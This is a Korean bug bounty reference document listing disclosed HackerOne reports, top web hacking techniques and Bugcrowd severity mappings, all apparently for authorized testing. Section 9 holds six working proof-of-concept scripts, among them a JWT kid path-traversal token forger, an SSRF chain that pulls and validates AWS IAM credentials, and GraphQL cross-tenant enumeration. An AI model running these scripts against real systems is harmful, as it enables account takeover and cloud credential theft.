- Chrome 캐시 동작을 오라클로 사용해 응답 크기 유추
- CSP/CORS 우회 없이 정보 유출 가능

---

## 8. Recent H1/Bugcrowd Top Reports

### 소스
- HackerOne Disclosed Reports: https://github.com/reddelexc/hackerone-reports
- HackerOne Hacktivity: https://hackerone.com/hacktivity
- BugBountyHunter Disclosed: https://www.bugbountyhunter.com/disclosed/
- HackerOne 9th Annual Report: https://www.hackerone.com/report/hacker-powered-security

---

### 8-A. GraphQL 상위 공개 보고서

| Rank | Report | Program | 금액 | 핵심 취약점 |
|------|--------|---------|------|------------|
| 1 | [#489146](https://hackerone.com/reports/489146) | HackerOne | $0 | GraphQL로 사용자 데이터 + 프로그램 메타데이터 대량 노출 |
| 2 | [#792927](https://hackerone.com/reports/792927) | HackerOne | $0 | Report Invitation GraphQL에서 이메일 주소 노출 |
| 3 | [#2122671](https://hackerone.com/reports/2122671) | HackerOne | $12,500 | mutation으로 타인 인증서/자격증 삭제 가능 |
| 4 | [#885539](https://hackerone.com/reports/885539) | X / xAI | $0 | GraphQL로 비공개 리스트 멤버십 노출 |
| 5 | [#1864188](https://hackerone.com/reports/1864188) | EXNESS | $3,000 | GraphQL endpoint SSRF |
| 6 | [#1711938](https://hackerone.com/reports/1711938) | GitHub | $0 | Project V2 GraphQL로 scoped token 권한 초과 |
| 7 | [#707433](https://hackerone.com/reports/707433) | HackerOne | $0 | GraphQL로 결제 트랜잭션 노출 |
| 8 | [#2207248](https://hackerone.com/reports/2207248) | Shopify | $5,000 | BillingDocument GraphQL 쿼리 접근 제어 미흡 |

---

### 8-B. 2025 주요 공개 보고서 (카테고리별)

**OAuth / ATO**:
- [H1 #665651](https://hackerone.com/reports/665651) (GSA, $0): OAuth 토큰 탈취로 사용자 계정 접수 — state 파라미터 미검증
- [H1 #131202](https://hackerone.com/reports/131202) (X/xAI, Critical): OAuth 토큰 직접 탈취

**SSRF**:
- HackerOne: GraphQL SSRF (EXNESS $3,000) — GraphQL 엔드포인트가 내부 서비스에 HTTP 요청
- Bugcrowd: Next.js Middleware SSRF — middleware 내 URL 검증 미흡으로 내부 네트워크 접근

**CI/CD**:
- CVE-2025-30066: tj-actions/changed-files 공급망 공격 — 23,000+ 레포 영향, $0 bounty (공개 취약점)
- CVE-2025-55190: ArgoCD API 자격증명 노출

**2025 트렌드 (HackerOne 9th Annual Report)**:
- AI 관련 취약점 보고 210% 증가 (2024 대비)
- Prompt injection 540% 증가 (가장 빠른 성장 벡터)
- 연간 총 지급액: $81M (전년 대비 13% 증가)

---

### 8-C. PortSwigger Top 10 Web Hacking Techniques 2025 (전체 목록)

| 순위 | 기법 | 저자 | 핵심 |
|------|------|------|------|
| 1 | Successful Errors: New SSTI Techniques | Vladislav Korchagin | 에러 기반 Blind SSTI, polyglot 탐지 |
| 2 | ORM Leaking More Than You Joined For | Alex Brown | ORM 검색/필터 기능 악용한 DB 추출 |
| 3 | Novel SSRF via HTTP Redirect Loops | Shubs | Blind SSRF를 redirect loop으로 가시화 |
| 4 | Lost in Translation: Unicode Normalization | Ryan & Isabella Barnett | Unicode 정규화 기반 우회 |
| 5 | SOAPwn: .NET HTTP Client Proxies | Piotr Bazydło | WSDL + HttpWebClientProtocol RCE |
| 6 | Cross-Site ETag Length Leak | Takeshi Kaneko | ETag 헤더로 크로스 오리진 응답 크기 측정 |
| 7 | Next.js, cache, and chains | Rachid Allam | Next.js 내부 캐시 포이즈닝 |
| 8 | XSS-Leak via Cross-Origin Redirects | Salvatore Abello | Chrome 커넥션 풀 우선순위로 리디렉션 hostname 유출 |
| 9 | Playing with HTTP/2 CONNECT | Flomb | HTTP/2 CONNECT로 내부 포트 스캔 |
| 10 | Parser Differentials | Joernchen | 언어/프레임워크 간 파서 불일치 악용 |

---

## 9. 실전 PoC 스니펫

### PoC 1: OAuth state 파라미터 검증 테스트 (Python)

```python
#!/usr/bin/env python3
"""OAuth state parameter validation checker.
Usage: python3 oauth_state_check.py https://target.com/oauth/authorize CLIENT_ID REDIRECT_URI
"""
import requests
import sys
from urllib.parse import urlparse, parse_qs

def check_oauth_state(auth_url, client_id, redirect_uri):
    # 1. state 없이 요청
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "openid profile email"
    }
    r = requests.get(auth_url, params=params, allow_redirects=False)
    if r.status_code in (200, 302):
        print("[POTENTIAL] No state parameter accepted — CSRF possible")
    else:
        print(f"[INFO] Status {r.status_code} without state")

    # 2. 고정 state로 요청 (두 번 반복하여 동일 state 반환 여부 확인)
    params["state"] = "FIXED_STATIC_VALUE"
    r1 = requests.get(auth_url, params=params, allow_redirects=False)
    r2 = requests.get(auth_url, params=params, allow_redirects=False)
    if r1.headers.get("Location") == r2.headers.get("Location"):
        print("[POTENTIAL] State is static — CSRF likely vulnerable")

if __name__ == "__main__":
    check_oauth_state(sys.argv[1], sys.argv[2], sys.argv[3])
```

---

### PoC 2: PKCE code_verifier 검증 우회 테스트 (curl)

```bash
#!/bin/bash
# Test if PKCE verification is actually enforced on token endpoint

TARGET="https://target.com"
CLIENT_ID="your_client_id"
REDIRECT_URI="https://your-callback.com/cb"
CODE="AUTHORIZATION_CODE_FROM_FLOW"  # 실제 code로 교체

echo "[*] Testing token exchange WITHOUT code_verifier..."
curl -s -X POST "$TARGET/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=$CODE" \
  -d "client_id=$CLIENT_ID" \
  -d "redirect_uri=$REDIRECT_URI"
  # code_verifier 파라미터 의도적 제거

echo ""
echo "[*] If access_token returned above → PKCE bypass CONFIRMED"
echo "[*] Expected: 400 with 'code_verifier required'"
```

---

### PoC 3: JWT kid Path Traversal (Python)

```python
#!/usr/bin/env python3
"""JWT kid path traversal - sign with /dev/null as key.
Requires: pip install pyjwt cryptography
"""
import jwt
import json
import base64

def forge_jwt_kid_traversal(target_claims: dict) -> str:
    """Forge JWT using /dev/null as signing key via kid traversal."""
    header = {
        "alg": "HS256",
        "kid": "../../dev/null",  # path traversal
        "typ": "JWT"
    }

    # /dev/null = 빈 파일 → secret = ""
    secret = ""

    token = jwt.encode(
        target_claims,
        secret,
        algorithm="HS256",
        headers=header
    )
    return token

# 예시: admin 권한으로 위조
claims = {
    "sub": "1337",
    "role": "admin",
    "iat": 1700000000,
    "exp": 9999999999
}
token = forge_jwt_kid_traversal(claims)
print(f"Forged token: {token}")
print(f"\nTest with:")
print(f"curl -H 'Authorization: Bearer {token}' https://target.com/api/admin")
```

---

### PoC 4: AWS IMDS SSRF 체인 (curl)

```bash
#!/bin/bash
# AWS EC2 metadata exfil via SSRF proxy endpoint
# Replace TARGET_SSRF_URL with the actual SSRF-vulnerable endpoint

TARGET_SSRF_URL="https://target.com/fetch?url="
METADATA_BASE="http://169.254.169.254"

echo "[1] Checking for IAM role presence..."
ROLE=$(curl -s "${TARGET_SSRF_URL}${METADATA_BASE}/latest/meta-data/iam/security-credentials/")
echo "IAM Role: $ROLE"

if [ -n "$ROLE" ]; then
    echo ""
    echo "[2] Extracting credentials for role: $ROLE"
    CREDS=$(curl -s "${TARGET_SSRF_URL}${METADATA_BASE}/latest/meta-data/iam/security-credentials/${ROLE}")
    echo "$CREDS" | python3 -m json.tool

    # 자격증명 추출
    ACCESS_KEY=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['AccessKeyId'])")
    SECRET=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['SecretAccessKey'])")
    TOKEN=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['Token'])")

    echo ""
    echo "[3] Validating credentials..."
    AWS_ACCESS_KEY_ID=$ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$SECRET \
    AWS_SESSION_TOKEN=$TOKEN \
    aws sts get-caller-identity 2>/dev/null || echo "aws cli not available"
fi

echo ""
echo "[IMDSv2 test] Attempting token-based request..."
# IMDSv2: PUT 요청 포워딩이 가능한 경우
TOKEN_V2=$(curl -s -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "${TARGET_SSRF_URL}${METADATA_BASE}/latest/api/token")
echo "IMDSv2 Token: $TOKEN_V2"
```

---

### PoC 5: GraphQL Tenant IDOR + Batching (Python)

```python
#!/usr/bin/env python3
"""GraphQL cross-tenant IDOR enumeration.
Tests if tenant data is accessible by modifying tenant-related headers or arguments.
"""
import requests

TARGET = "https://target.com/graphql"
MY_TOKEN = "Bearer YOUR_JWT_TOKEN"

QUERY = """
query GetUsers($tenantId: ID!) {
  users(tenantId: $tenantId) {
    id
    email
    role
    name
  }
}
"""

def test_tenant_idor(target_tenant_ids: list):
    session = requests.Session()
    session.headers.update({
        "Authorization": MY_TOKEN,
        "Content-Type": "application/json"
    })

    # 1. 단일 쿼리 테스트
    for tid in target_tenant_ids:
        resp = session.post(TARGET, json={
            "query": QUERY,
            "variables": {"tenantId": str(tid)}
        })
        data = resp.json()
        if "users" in data.get("data", {}) and data["data"]["users"]:
            print(f"[VULNERABLE] Tenant {tid}: {len(data['data']['users'])} users accessible")

    # 2. Batching으로 rate limit 우회 (다중 tenant 동시 조회)
    batch_queries = [
        {"query": QUERY, "variables": {"tenantId": str(tid)}}
        for tid in target_tenant_ids
    ]
    resp = session.post(TARGET, json=batch_queries)
    if resp.status_code == 200:
        for i, result in enumerate(resp.json()):
            if result.get("data", {}).get("users"):
                print(f"[BATCH VULN] Tenant {target_tenant_ids[i]}: accessible")

# 순차 정수 ID 테넌트 열거
test_tenant_idor(range(1, 50))
```

---

### PoC 6: Webhook HMAC Replay 테스트 (Python)

```python
#!/usr/bin/env python3
"""Webhook security tester: HMAC bypass + replay attack."""
import hmac
import hashlib
import requests
import time

TARGET_WEBHOOK = "https://target.com/webhooks/stripe"

# 캡처된 정상 webhook (Burp에서 intercept)
CAPTURED_BODY = b'{"type":"payment_intent.succeeded","data":{"object":{"amount":10000}}}'
CAPTURED_SIGNATURE = "v1=CAPTURED_HMAC_VALUE"
CAPTURED_TIMESTAMP = "1700000000"  # 과거 타임스탬프

def test_replay_attack():
    """Test if old timestamps are accepted (replay attack)."""
    print("[*] Testing replay with old timestamp...")
    resp = requests.post(TARGET_WEBHOOK,
        data=CAPTURED_BODY,
        headers={
            "Content-Type": "application/json",
            "Stripe-Signature": f"t={CAPTURED_TIMESTAMP},{CAPTURED_SIGNATURE}",
        }
    )
    print(f"Replay response: {resp.status_code}")
    if resp.status_code == 200:
        print("[VULNERABLE] Server accepted old timestamp — replay attack possible")

def test_missing_signature():
    """Test if missing signature header bypasses verification."""
    print("[*] Testing without signature header...")
    resp = requests.post(TARGET_WEBHOOK,
        data=CAPTURED_BODY,
        headers={"Content-Type": "application/json"}
        # X-Signature / Stripe-Signature 완전 제거
    )
    print(f"No-signature response: {resp.status_code}")
    if resp.status_code == 200:
        print("[VULNERABLE] Server processed request without signature")

test_replay_attack()
test_missing_signature()
```

---

## 10. Gate 1 VRT 매핑

### 소스
- Bugcrowd VRT: https://bugcrowd.com/vulnerability-rating-taxonomy
- 프로젝트 내 VRT 참조: `knowledge/techniques/bugcrowd_vrt.md`

---

### 10-A. OAuth / OIDC 취약점 VRT 매핑

| 취약점 | Bugcrowd VRT | 기본 Priority | 비고 |
|--------|-------------|--------------|------|
| OAuth state CSRF → ATO | Broken Authentication and Session Management > CSRF > Session Riding | P2 | ATO 직결 시 P1 가능 |
| PKCE bypass (code 탈취) | Broken Authentication > OAuth Misconfiguration | P2~P3 | 실제 탈취 시나리오 증명 필요 |
| redirect_uri 조작 | Broken Authentication > Open Redirect (Auth Flow) | P2 | Code 누출 증명 시 P1 |
| response_mode fragment 누출 | Sensitive Data Exposure > Token Leakage | P3 | 자격증명 포함 여부에 따라 조정 |
| Mutable claim ATO | Broken Authentication > Account Takeover | P1 | 실제 타인 계정 탈취 증명 필수 |

---

### 10-B. JWT 취약점 VRT 매핑

| 취약점 | Bugcrowd VRT | 기본 Priority |
|--------|-------------|--------------|
| alg=none 우회 | Broken Authentication > JWT Vulnerability | P1~P2 |
| kid path traversal | Injection > Path Traversal (Auth Context) | P2 |
| jku SSRF | Server-Side Request Forgery > External Service Interaction | P2 |
| Algorithm confusion (RS256→HS256) | Broken Authentication > Cryptographic Issues | P1~P2 |
| jwk header injection | Broken Authentication > JWT Vulnerability | P1 |

---

### 10-C. SSRF VRT 매핑

| 취약점 | Bugcrowd VRT | 기본 Priority |
|--------|-------------|--------------|
| SSRF → AWS IMDS (자격증명 획득) | Server-Side Request Forgery > Full Internal Read | P1 |
| SSRF → 내부 서비스 접근 | Server-Side Request Forgery > Internal Network Scanning | P2 |
| Blind SSRF (외부 콜백만 가능) | Server-Side Request Forgery > Blind SSRF | P3~P4 |
| Lambda env leak via SSRF | Sensitive Data Exposure > Cloud Credentials | P1 |

---

### 10-D. Tenant / IDOR VRT 매핑

| 취약점 | Bugcrowd VRT | 기본 Priority |
|--------|-------------|--------------|
| Cross-tenant 데이터 접근 (full read) | Broken Access Control > IDOR > Read | P2~P1 |
| Tenant header confusion (전체 tenant 열거) | Broken Access Control > Mass Assignment / Header Injection | P1 |
| GraphQL IDOR (타인 오브젝트 조회) | Broken Access Control > IDOR > Read | P2~P3 |
| GraphQL mutation IDOR (타인 오브젝트 수정/삭제) | Broken Access Control > IDOR > Write | P1~P2 |

---

### 10-E. CI/CD VRT 매핑

| 취약점 | Bugcrowd VRT | 기본 Priority |
|--------|-------------|--------------|
| GitHub Actions secrets 노출 (외부 송출) | Sensitive Data Exposure > CI/CD Secrets | P2 |
| ArgoCD 비인증 API 접근 | Broken Authentication > Unauthenticated Access | P1 |
| OIDC sub claim 조작 → Cloud 권한 획득 | Broken Authentication > Federated Identity Misconfiguration | P1~P2 |
| Pwn Request (pull_request_target 남용) | Remote Code Execution > CI/CD Pipeline | P1 |

---

### 10-F. CORS / CSP VRT 매핑

| 취약점 | Bugcrowd VRT | 기본 Priority |
|--------|-------------|--------------|
| CORS wildcard + credentials | Sensitive Data Exposure > CORS Misconfiguration | P2~P3 |
| CORS origin reflection + credentials | Sensitive Data Exposure > CORS Misconfiguration | P2 |
| CSP bypass → XSS 활성화 | Cross-Site Scripting > Reflected/Stored | P1~P2 |
| XS-Leak (ETag, connection pool) | Information Disclosure > Side-Channel | P3 |

---

### 10-G. Severity Anchoring 가이드 (Bugcrowd 기준)

**P1 (Critical) 조건**:
- 실제 타인 계정 탈취 (ATO) PoC 제공
- Cloud IAM 자격증명 획득 (AWS Key + 실제 권한 확인)
- Cross-tenant 전체 데이터 열람 + 수정

**P2 (High) 조건**:
- 자격증명 없이 인증 우회 (JWT alg=none)
- SSRF로 내부 서비스 접근 (자격증명 미획득)
- OAuth redirect_uri 조작 + code 탈취 (ATO 체인 미완성)

**P3 (Medium) 조건**:
- Blind SSRF (외부 DNS 콜백만)
- CORS misconfiguration (자격증명 미포함)
- GraphQL IDOR (비민감 데이터)

**P4 (Low) 조건**:
- 정보 노출 (버전, 내부 경로, 에러 메시지)
- 이론적 CSRF (실제 state 없음)

---

*문서 끝 — 다음 업데이트 예정: 2026-10-01*
*참조: PortSwigger Research, HackerOne Hacktivity, Doyensec Blog, HackTricks, StepSecurity Incidents*
